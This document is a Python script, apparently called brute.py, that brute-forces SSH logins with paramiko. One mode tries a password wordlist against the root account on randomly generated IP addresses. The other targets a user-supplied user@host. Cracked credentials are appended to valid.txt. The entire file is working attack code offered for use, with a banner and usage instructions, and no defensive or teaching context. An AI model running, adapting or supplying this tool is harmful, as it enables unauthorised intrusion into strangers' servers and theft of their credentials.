import socket
import time

from files.colors import R , RAN ,  C, W ,Y ,G
from files.banner import banner , clear
from files.sprint import sprint
import paramiko
import random
import sys


def clean(str , log=">"):
    print(f"{W}[{G}{log}{W}] {C}{str}")

clear()

banner()

def random_ssh(user , ip_range):
    rand_names = []
    passwords = [x.strip("\n") for x in open(wordlist, "r").readlines()]

    for i in range(ip_range):
        ip1 =str(random.randint(0,255))
        ip2 = str(random.randint(0,255))
        ip3 = str(random.randint(0,255))
        ip4 = str(random.randint(0,255))
        ip = f"{ip1}.{ip2}.{ip3}.{ip4}"

        clear()
        print("\n\n\n")
        print(f"\t\t{W}</>Generated:~ {RAN} {ip}")
        rand_names.append(ip)

    total_names = len(rand_names)
    total_pass = len(passwords)

    clean(f"Total Usernames: {R}{total_names}" , ">")
    clean(f"Total Passwords: {R}{total_pass}" , ">")

    print("\n")
    sprint(f"{Y}       ----- {W} Loading -----")
    print("\n")

    ssh = paramiko.SSHClient()
    for ip in rand_names:
        for password in passwords:
            try:
                print(f"{Y}[{W}~{Y}]{C} Trying: {G}Username={R}{user+'@'+ip}\t{G}Password={R}{password}")
                ssh.connect(hostname=ip, username=user, password=password)
                print(f"\n{W}Found:~ {Y}Username={C}{user+'@'+ip}\t{Y}Password={C}{password}\n")
                with open("valid.txt" , "a+") as file:
                    file.write(f"Username {user+'@'+ip}\t\tPassword={password}")
            except paramiko.AuthenticationException:
                print(f"{W}>>>{R} Invalid {W}| Not Found {W}<<<")
                pass

            except paramiko.SSHException:
                print(f"{W}>>>{R} Invalid {W}| Not Found {W}<<<")
                time.sleep(5)
                pass
            except (paramiko.BadHostKeyException, paramiko.AuthenticationException,
                    socket.error):
                print(f"{W}>>>{R} Invalid {W}|{R} Not Found {W}<<<")
                pass


def user_defined(name):
    passwords = [x.strip("\n") for x in open(wordlist, "r").readlines()]
    uname, host = name.split("@")
    ssh = paramiko.SSHClient()
    for password in passwords:

            try:
                print(f"{Y}[{W}~{Y}]{C} Trying: {G}Username={R}{name}\t{G}Password={R}{password}")
                ssh.connect(hostname=host, username=uname, password=password)
                print(f"{W}Found:~ {Y}Username={C}{name}\t{Y}Password={C}{password}")
                with open("valid.txt", "a+") as file:
                    file.write(f"Username {name}\t\tPassword={password}")
            except paramiko.AuthenticationException:
                print(f"{W}>>>{R} Invalid {W}| Not Found {W}<<<")
                pass

            except paramiko.SSHException:
                print(f"{W}>>>{R} Invalid {W}| Not Found {W}<<<")
                time.sleep(5)
                pass
            except (paramiko.BadHostKeyException, paramiko.AuthenticationException,
                    socket.error):
                print(f"{W}>>>{R} Invalid {W}|{R} Not Found {W}<<<")
                pass


if __name__ == '__main__':
    if (len(sys.argv) < 2) and "random" not in sys.argv:
        print("\n" + "-" * 20)
        sprint(f"{RAN}[>] {W}Usage: {C}python3 brute.py <username> <wordlist>")
        sprint(f"{RAN}[>] {W}Usage: {C}python3 brute.py random <range_of_ip> <wordlist>")
        sprint(f"{RAN}[>] {W}Usage:~ {C} To use default wordlist\n{W}[>]{Y} python3 <username {R}|{Y} range_of_ip> default")
        print(f"{G}>>> {Y}default will use the default wordlist {G}<<<")
        print("\n" + "-" * 20)
        exit()
    else:
        if sys.argv[1].lower() == "random":
            user_name = "root"
            ip_range = sys.argv[2]
            if sys.argv[3].lower() == "default":
                wordlist = "wordlist.txt"
            else:
                wordlist = sys.argv[3]
            random_ssh(user=user_name, ip_range=int(ip_range))


        else:
            user_name = sys.argv[1]
            if sys.argv[2].lower() == "default":
                wordlist = "wordlist.txt"
            else:
                wordlist = sys.argv[2]
            
            user_defined(user_name)
            

















